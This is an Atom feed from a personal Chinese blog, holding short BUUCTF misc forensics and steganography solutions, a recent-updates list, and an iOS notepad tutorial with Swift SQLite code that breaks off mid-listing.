<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汐白的学习档案</title>
  
  <subtitle>小萌新一枚QAQ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xibai.xyz/"/>
  <updated>2021-05-16T05:42:20.142Z</updated>
  <id>http://xibai.xyz/</id>
  
  <author>
    <name>Ximu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF-MISC(四)</title>
    <link href="http://xibai.xyz/2021/04/19/BUU-Misc-four/"/>
    <id>http://xibai.xyz/2021/04/19/BUU-Misc-four/</id>
    <published>2021-04-19T04:26:11.000Z</published>
    <updated>2021-05-16T05:42:20.142Z</updated>
    
    <content type="html"><![CDATA[<p><strong>最近更新：</strong> <em>2021-04-19 12:28</em></p><h2 id="MRCTF2020-pyFlag"><a href="#MRCTF2020-pyFlag" class="headerlink" title="[MRCTF2020]pyFlag"></a>[MRCTF2020]pyFlag</h2><p>三张图片末尾各有一部分压缩包的数据，提取拼接，是一个加密压缩包，爆破一下得到密码。<br>然后是base套餐，85-&gt;16-&gt;32-&gt;16-&gt;64</p><h2 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h2><p>百度一下，得知是慢扫描电视，无线电题目。<br>kali里面手动安装一个<code>QSSTV</code>，设置一下从文件解析<code>Options</code>-&gt;<code>Configuration</code>-&gt;<code>Sound</code>勾选<code>From file</code><br>然后解析一下即可看到flag图片</p><h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p>日常末尾压缩包，解压是一个elf，拖进ida直接看到flag</p><h2 id="UTCTF2020-spectogram"><a href="#UTCTF2020-spectogram" class="headerlink" title="[UTCTF2020]spectogram"></a>[UTCTF2020]spectogram</h2><p>查看频谱图即可</p><h2 id="watevrCTF-2019-Evil-Cuteness"><a href="#watevrCTF-2019-Evil-Cuteness" class="headerlink" title="[watevrCTF 2019]Evil Cuteness"></a>[watevrCTF 2019]Evil Cuteness</h2><p>末尾压缩包，解压缩，文本打开</p><h2 id="RCTF2019-disk"><a href="#RCTF2019-disk" class="headerlink" title="[RCTF2019]disk"></a>[RCTF2019]disk</h2><p>直接用<code>DiskGenius</code>查看vmdk会提示文件错误，winhex查看发现中间有一大块空间被写满了第一部分的flag。<br>用7z可以提取出<code>fat</code>文件，fat文件可以用<code>VeraCrypt</code>挂载，但是需要密码，印象中rctf当时应该给了一个密码，忘记有没有了<br>VeraCrypt: <a href="https://sourceforge.net/projects/veracrypt/" target="_blank" rel="noopener">https://sourceforge.net/projects/veracrypt/</a><br>就当没有吧，那这里就是一个小脑洞了，弱口令猜解，需要去猜到密码：rctf<br>然后挂载拿到第二个密码，VeraCrypt在挂载文件系统的时候，可以用不同的密码进入不同的系统，所以用第二个密码再一次挂载，挂在之后打开提示新的硬盘分区错误，用<code>DiskGenius</code>直接查看，发现这个文件系统被暴力写满了第二部分flag</p><h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到</p><h2 id="MRCTF2020-小O的考研复试"><a href="#MRCTF2020-小O的考研复试" class="headerlink" title="[MRCTF2020]小O的考研复试"></a>[MRCTF2020]小O的考研复试</h2><p>简单的。。。是叫同余式吧，忘记了，前年学的数论，定义和学术用语记不住了，总之是这个意思应该。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19260816</span>):</span><br><span class="line">    a = a * <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">    a%=(<span class="number">1e9</span>+<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h2 id="BSidesSF2019-table-tennis"><a href="#BSidesSF2019-table-tennis" class="headerlink" title="[BSidesSF2019]table-tennis"></a>[BSidesSF2019]table-tennis</h2><p>ICMP包末尾包含了一个html，把它提取出来得到一个base64编码，解码得flag</p><h2 id="INSHack2019-INSAnity"><a href="#INSHack2019-INSAnity" class="headerlink" title="[INSHack2019]INSAnity"></a>[INSHack2019]INSAnity</h2><p>签到</p><h2 id="INSHack2019-Sanity"><a href="#INSHack2019-Sanity" class="headerlink" title="[INSHack2019]Sanity"></a>[INSHack2019]Sanity</h2><p>一个ctf三个签到emmm</p><h2 id="INSHack2017-insanity"><a href="#INSHack2017-insanity" class="headerlink" title="[INSHack2017]insanity"></a>[INSHack2017]insanity</h2><p>继续签到</p><h2 id="CFI-CTF-2018-webLogon-capture"><a href="#CFI-CTF-2018-webLogon-capture" class="headerlink" title="[CFI-CTF 2018]webLogon capture"></a>[CFI-CTF 2018]webLogon capture</h2><p>追踪唯一一个http流量，把流量包里得password解url编码即可</p><h2 id="很好的色彩呃？"><a href="#很好的色彩呃？" class="headerlink" title="很好的色彩呃？"></a>很好的色彩呃？</h2><p>色号转flag系列：找个拾色器查一下十六进制色号，发现六个颜色最后两位不一样，转一下ascii码即可</p><h2 id="GUET-CTF2019-520的暗示"><a href="#GUET-CTF2019-520的暗示" class="headerlink" title="[GUET-CTF2019]520的暗示"></a>[GUET-CTF2019]520的暗示</h2><p>winhex查看<code>photo.dat</code>，很明显是一个和<code>0x33</code>异或的<code>jpg</code>，写个脚本异或回去。<br>然后发现图片是<code>LTE</code>信息，利用这些信息可以定位到基站位置。<br>推荐网站:<a href="http://www.cellocation.com/" target="_blank" rel="noopener">http://www.cellocation.com/</a><br>flag{桂林电子科技大学花江校区}</p><h2 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h2><p>图片左上角有一块黑白色块。仔细观察发现黑白色块加起来是八的整数倍。<br>横向解析，黑为1，白为0，然后将其八位一组转ASCII码，得到flag{12345678}</p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><h2 id="请移步篇章三"><a href="#请移步篇章三" class="headerlink" title="请移步篇章三"></a><a href="http://xibai.xyz/2020/02/24/BUU-Misc-three/">请移步篇章三</a></h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>最近更新</title>
    <link href="http://xibai.xyz/2021/04/14/recently/"/>
    <id>http://xibai.xyz/2021/04/14/recently/</id>
    <published>2021-04-14T10:15:11.000Z</published>
    <updated>2021-05-16T05:42:20.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这里列出最近有更新过的内容"><a href="#这里列出最近有更新过的内容" class="headerlink" title="这里列出最近有更新过的内容"></a>这里列出最近有更新过的内容</h2><h3 id="05-16"><a href="#05-16" class="headerlink" title="05.16"></a>05.16</h3><h4 id="2021-CISCN-first"><a href="#2021-CISCN-first" class="headerlink" title="2021-CISCN-first"></a>2021-CISCN-first</h4><h3 id="05-08"><a href="#05-08" class="headerlink" title="05.08"></a>05.08</h3><h4 id="2021-Redhat"><a href="#2021-Redhat" class="headerlink" title="2021-Redhat"></a>2021-Redhat</h4><h3 id="04-19"><a href="#04-19" class="headerlink" title="04.19"></a>04.19</h3><h4 id="BUUCTF-MISC-四"><a href="#BUUCTF-MISC-四" class="headerlink" title="BUUCTF-MISC(四)"></a>BUUCTF-MISC(四)</h4><h3 id="04-14"><a href="#04-14" class="headerlink" title="04.14"></a>04.14</h3><h4 id="BUUCTF-MISC-三"><a href="#BUUCTF-MISC-三" class="headerlink" title="BUUCTF-MISC(三)"></a><a href="http://xibai.xyz/2020/02/24/BUU-Misc-three/">BUUCTF-MISC(三)</a></h4>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>iOS_记事本开发</title>
    <link href="http://xibai.xyz/2020/12/27/iOS_notepad/"/>
    <id>http://xibai.xyz/2020/12/27/iOS_notepad/</id>
    <published>2020-12-27T08:15:11.000Z</published>
    <updated>2021-05-16T05:42:20.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于启动页和APP图标的设置"><a href="#关于启动页和APP图标的设置" class="headerlink" title="关于启动页和APP图标的设置"></a>关于启动页和APP图标的设置</h2><p>之前在更换启动页内容的时候发现更新启动页图片之后iOS虚拟设备未能成功设置为新的启动页。<br>这里可以参考这个文章末尾的方法：<a href="https://www.jianshu.com/p/d34c36cd15fc" target="_blank" rel="noopener">https://www.jianshu.com/p/d34c36cd15fc</a></p><h2 id="关于页面跳转的一些问题"><a href="#关于页面跳转的一些问题" class="headerlink" title="关于页面跳转的一些问题"></a>关于页面跳转的一些问题</h2><p>页面跳转的三种方式：<a href="https://blog.csdn.net/zcc9618/article/details/82968734" target="_blank" rel="noopener">https://blog.csdn.net/zcc9618/article/details/82968734</a></p><p>页面跳转利用<code>prepare</code>方法以及<code>segue</code>传输数据时<code>identifier</code>值为空的解决办法：<a href="https://www.hangge.com/blog/cache/detail_720.html" target="_blank" rel="noopener">https://www.hangge.com/blog/cache/detail_720.html</a></p><h2 id="Swift使用CoreData储存数据"><a href="#Swift使用CoreData储存数据" class="headerlink" title="Swift使用CoreData储存数据"></a>Swift使用CoreData储存数据</h2><p>这里可以直接作为swift的一种数据库来理解。就是swift有一个叫coredata的数据库，创建项目的时候有个默认未勾选的选项<code>use coredata</code>就是是否为项目创建一个这个数据库文件，没有勾选的话可以在<code>New File</code>中手动选择添加，都一样。</p><p>详细操作过程可以参考这篇文章：<a href="https://www.sohu.com/a/223213477_663371" target="_blank" rel="noopener">https://www.sohu.com/a/223213477_663371</a><br>这里简单举例：</p><p><code>xcdatamodeld</code>即为<code>coredata</code>的数据库文件。在<code>name.xcdatamodeld</code>文件中设置数据表。建表的话鼠标点击<code>Add Entity</code>即可。然后添加相关<code>Attributes</code></p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228125341.png" alt="20201228125341"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228123752.png" alt="20201228123752"></p><h2 id="一些小问题"><a href="#一些小问题" class="headerlink" title="一些小问题"></a>一些小问题</h2><p>代码中有些针对控件的操作需要用到控件的<code>identifier</code>来定位被操作的控件。控件的<code>identifier</code>默认一般为空，所以需要对其进行设置，设置的值和代码中定位控件用的值一样即可。这里用文本记事的例子举例：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228140046.png" alt="20201228140046"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228135652.png" alt="20201228135652"></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>这里用的是分组！！！而非是文件夹！！！<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142526.png" alt="20201228142526"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142356.png" alt="20201228142356"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142425.png" alt="20201228142425"></p><h2 id="文本记事"><a href="#文本记事" class="headerlink" title="文本记事"></a>文本记事</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>Note.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"><span class="keyword">import</span> SQLite3</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本记事的数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> id: <span class="type">Int</span></span><br><span class="line">    <span class="keyword">var</span> contents: <span class="type">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本记事数据库操作</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> database: <span class="type">OpaquePointer!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">let</span> main = <span class="type">NoteManager</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">init</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">connect</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> database != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> databaseURL = <span class="keyword">try</span> <span class="type">FileManager</span>.<span class="keyword">default</span>.url(<span class="keyword">for</span>: .documentDirectory, <span class="keyword">in</span>: .userDomainMask, appropriateFor: <span class="literal">nil</span>, create: <span class="literal">true</span>).appendingPathComponent(<span class="string">"notes.sqlite3"</span>)</span><br><span class="line">            <span class="keyword">if</span> sqlite3_open(databaseURL.path, &amp;database) == <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> sqlite3_exec(database, <span class="string">"CREATE TABLE IF NOT EXISTS notes (contents TEXT)"</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>) == <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"Could not create table"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Could not connect"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> <span class="keyword">let</span> error &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not create database \(error)"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">create</span><span class="params">()</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer!</span></span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">"INSERT INTO notes (contents) VALUES ('New note')"</span>, -<span class="number">1</span>, &amp;statement, <span class="literal">nil</span>) != <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not create query"</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  != <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not insert note"</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">        <span class="keyword">return</span> <span class="type">Int</span>(sqlite3_last_insert_rowid(database))</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">getAllNotes</span><span class="params">()</span></span> -&gt; [<span class="type">Note</span>] &#123;</span><br><span class="line">        connect()</span><br><span class="line">        <span class="keyword">var</span> result: [<span class="type">Note</span>] = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer!</span></span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">"SELECT rowid, contents FROM notes"</span>, -<span class="number">1</span>, &amp;statement, <span class="literal">nil</span>) != <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Eroor creating select"</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> sqlite3_step(statement) == <span class="type">SQLITE_ROW</span> &#123;</span><br><span class="line">            result.append(<span class="type">Note</span>(id: <span class="type">Int</span>(sqlite3_column_int(statement, <span class="number">0</span>)), contents: <span class="type">String</span>(cString: sqlite3_column_text(statement, <span class="number">1</span>))))</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">save</span><span class="params">(note: Note)</span></span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer!</span></span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">"UPDATE notes SET contents = ? WHERE rowid = ?"</span>, -<span class="number">1</span>, &amp;statement, <span class="literal">nil</span>) != <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not create update statement"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_bind_text(statement, <span class="number">1</span>, <span class="type">NSString</span>(string: note.contents).utf8String, -<span class="number">1</span>, <span class="literal">nil</span>)</span><br><span class="line">        sqlite3_bind_int(statement, <span class="number">2</span>, <span class="type">Int32</span>(note.id))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  != <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not update note"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">delete</span><span class="params">(note: Note)</span></span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer!</span></span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">"DELETE FROM notes WHERE rowid = ?"</span>, -<span class="number">1</span>, &amp;statement, <span class="literal">nil</span>) != <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not create delete statement"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_bind_int(statement, <span class="number">1</span>, <span class="type">Int32</span>(note.id))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  != <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Could not delete note"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文本列表界面"><a href="#文本列表界面" class="headerlink" title="文本列表界面"></a>文本列表界面</h3><p>ViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewController</span>: <span class="title">UITableViewController</span>, <span class="title">UISearchBarDelegate</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> notes: [<span class="type">Note</span>] = []</span><br><span class="line">    <span class="keyword">var</span> notesBackup: [<span class="type">Note</span>] = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 搜索框</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">var</span> searchBar: <span class="type">UISearchBar!</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">searchBar</span><span class="params">(<span class="number">_</span> searchBar: UISearchBar, textDidChange searchText: String)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> searchText == <span class="string">""</span> &#123;</span><br><span class="line">            notes = notesBackup</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            notes = []</span><br><span class="line">            <span class="keyword">for</span> note: <span class="type">Note</span> <span class="keyword">in</span> notesBackup &#123;</span><br><span class="line">                <span class="keyword">if</span> note.contents.lowercased().<span class="built_in">contains</span>(searchText.lowercased()) &#123;</span><br><span class="line">                    notes.append(note)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一条新笔记</span></span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">createNote</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="number">_</span> = <span class="type">NoteManager</span>.main.create()</span><br><span class="line">        reload()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span><span class="params">(<span class="number">_</span> animated: Bool)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewWillAppear(<span class="literal">true</span>)</span><br><span class="line">        reload()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        searchBar.delegate = <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">numberOfSections</span><span class="params">(<span class="keyword">in</span> tableView: UITableView)</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, numberOfRowsInSection section: Int)</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> notes.<span class="built_in">count</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让每一个tableCell显示对应文本笔记的内容</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, cellForRowAt indexPath: IndexPath)</span></span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell = tableView.dequeueReusableCell(withIdentifier: <span class="string">"NoteCell"</span>, <span class="keyword">for</span>: indexPath)</span><br><span class="line">        cell.textLabel?.text = notes[indexPath.row].contents</span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重载页面</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">reload</span><span class="params">()</span></span> &#123;</span><br><span class="line">        notes = <span class="type">NoteManager</span>.main.getAllNotes()</span><br><span class="line">        notesBackup = <span class="type">NoteManager</span>.main.getAllNotes()</span><br><span class="line">        <span class="keyword">self</span>.tableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 页面跳转时把对应笔记b写入新页面</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">prepare</span><span class="params">(<span class="keyword">for</span> segue: UIStoryboardSegue, sender: <span class="keyword">Any</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> segue.identifier == <span class="string">"NoteSegue"</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> destination = segue.destination <span class="keyword">as</span>? <span class="type">NoteViewController</span> &#123;</span><br><span class="line">                destination.note = notes[tableView.indexPathForSelectedRow!.row]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文本详情界面"><a href="#文本详情界面" class="headerlink" title="文本详情界面"></a>文本详情界面</h3><p>NoteViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span 